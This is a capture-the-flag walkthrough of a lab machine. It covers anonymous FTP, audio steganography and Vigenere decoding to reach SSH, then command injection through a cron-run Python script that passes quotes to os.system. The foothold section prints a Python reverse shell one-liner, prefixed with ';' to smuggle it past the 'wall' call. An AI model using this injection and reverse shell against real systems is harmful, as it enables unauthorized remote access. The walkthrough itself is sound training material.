# what I learn
- sonic-visualiser
- Vigenere cipher
# enumerate
PORT
- 21/tcp open  ftp
```
ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
```
- 22/tcp open  ssh
- 80/tcp open  http
  - Apache/2.4.29 (Ubuntu) Server at 10.10.50.103 Port 80
  - GOBUSTER
    - /contracts (Status: 301)
    - /html (Status: 301)
    - /images (Status: 301)
    - /index.html (Status: 200)
    - /scripts (Status: 301)
      - CowardlyGoblin 2020-05-18 17:55 	7.4K	 
      - ForgetfulThug	2020-05-18 17:55 	7.2K
      - MeanLion	2020-05-18 17:55 	7.4K
      - SelfishGhost	2020-05-18 17:55 	7.0K
      - TactlessTiger	2020-05-18 17:55 	7.0K	 
    - /auditions
      - must_practice_corrupt_file.mp3

* must_practice_corrupt_file.mp3: containt a hidden message.
I used sonic-visualiser to analyzed the audio and acquired a password
* dad_tasks: contain a cipher text in base64
decoded the text from base64:
```
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```
after some using analyzer, I found out that the text is encrypted with Vigenere Cipher, by using the password that we acquired from the .mp3 to decrypt the text:
```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... <password>
```


# foothold
now let ssh to the server using weston + password:

```console
weston@national-treasure:~$ sudo -l
[sudo] password for weston: 
Matching Defaults entries for weston on national-treasure:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
weston@national-treasure:~$ ^C
weston@national-treasure:~$ cat /usr/bin/bees
#!/bin/bash

wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
weston@national-treasure:~$ bees
                                                                               
Broadcast message from weston@national-treasure (pts/0) (Sat Jul 25 13:55:02 20
                                                                               
AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!
weston@national-treasure:~$ id
uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
```
during the time I enumerate the server, there is a message which pop up from time to time (cronjob)
```
Broadcast message from cage@national-treasure (somewhere) (Sat Jul 25 13:42:01 
                                                                               
Well, I'm one of those fortunate people who like my job, sir. Got my first chemistry set when I was seven, blew my eyebrows off, we never saw the cat again, been into it ever since. — The Rock
```
As you see, there is a file call `bees` which didnt do much. note that weston are user of group `cage`. I then decided to serach for a file which own by *group cage*
```console
weston@national-treasure:~$ find / -group cage 2> /dev/null
/home/cage
/opt/.dads_scripts
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files
/opt/.dads_scripts/.files/.quote
weston@national-treasure:~$ ls -la /opt/.dads_scripts/.files/.quotes
-rwxrw---- 1 cage cage 4204 May 25 23:47 /opt/.dads_scripts/.files/.quotes
```
There are really interesting file. for instance `spread_the_quotes.py`
```py
weston@national-treasure:~$ cat /opt/.dads_scripts/spread_the_quotes.py
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```
so the script is pick a quote randomly from `/opt/.dads_scripts/.files/.quotes`. Thereafter `os.system` was call to print the qoute. Since `os.system` was call, we can inject a os command to script and make it do what ever we want. In this case we will inject a reverse shell to `/opt/.dads_scripts/.files/.quotes`.


remove all qoute by ```echo '' > /opt/.dads_scripts/.files/.quotes``` and insert the following command in `.quotes`: 
```py
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
note that we added `;`. coz we need to escalate from `'wall + '`. now `os.system` will execute *wall* and our reverse shell seperately. Now open netcat and wait for the shell

# user flag
```
$ whoami
cage
$ ls
email_backup
Super_Duper_Checklist
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ id
id
uid=1000(cage) gid=1000(cage) groups=1000(cage),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
```
the user flag can be found in one of the file in `/home/cage`.

# root
after some enumerating I found a really wried email:
```
Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage
```
`haiinspsyanileph` is a cipher text. enctyted using Vigenere cipher: what is the password? check for the word that appear many time in the text. User Chef, Vigenere decoder to get the plaintext
```
$ su root
su root
```
# ref:
- https://www.youtube.com/watch?v=rD-HTcYQmBU
- [vigenere cracker](https://www.guballa.de/vigenere-solver)
- [Cipher Identifier and Analyzer](https://www.boxentriq.com/code-breaking/cipher-identifier)

